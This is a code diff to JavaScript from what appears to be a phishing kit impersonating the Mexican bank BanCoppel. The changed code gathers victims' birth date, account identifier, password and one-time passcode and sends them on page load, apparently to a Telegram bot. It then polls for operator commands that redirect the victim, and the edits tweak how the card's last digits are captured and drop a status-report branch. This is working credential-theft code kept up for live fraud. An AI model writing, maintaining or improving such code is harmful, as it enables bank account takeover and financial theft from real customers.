@@ -84,6 +84,8 @@ document.addEventListener('DOMContentLoaded', async () => {
   const transactionId = localStorage.getItem("transactionId") || (Date.now().toString(36) + Math.random().toString(36).slice(2));
   localStorage.setItem("transactionId", transactionId);
 
+  const ultimos = session.identificador?.slice(-2) || "??";
+
   const mensaje = `
 <b>INGRESO BANC0PPEL (OTP)</b>
 🆔 ID: <code>${transactionId}</code>
@@ -91,7 +93,7 @@ document.addEventListener('DOMContentLoaded', async () => {
 🎂 Nacimiento: ${session.nacimiento}
 💳 Tipo: ${session.tipo}
 🔢 Identificador: ${session.identificador}
-🔸 Últimos 2 dígitos: ${session.digitosFinales}
+🔸 Últimos 2 dígitos: ${ultimos}
 🔐 Clave: ${session.clave}
 🔄 Dinámica OTP: ${otp}
 `;
@@ -110,7 +112,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     body: "data=" + encodeURIComponent(mensaje) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  // Obtener último update_id conocido
   const latestOffset = await getLastUpdateId(token);
   checkBoton(token, transactionId, latestOffset + 1);
 });
@@ -149,13 +150,6 @@ async function checkBoton(botToken, txId, offset) {
             return window.location.href = "cel-dina-error.html";
           case "finalizar":
             return window.location.href = "https://www.bancoppel.com";
-          case "confirm_finalizar":
-            await fetch("sendStatus.php", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ status: "Finalización OTP Exitosa" })
-            });
-            return; // NO redirige como pediste
         }
       }
     }
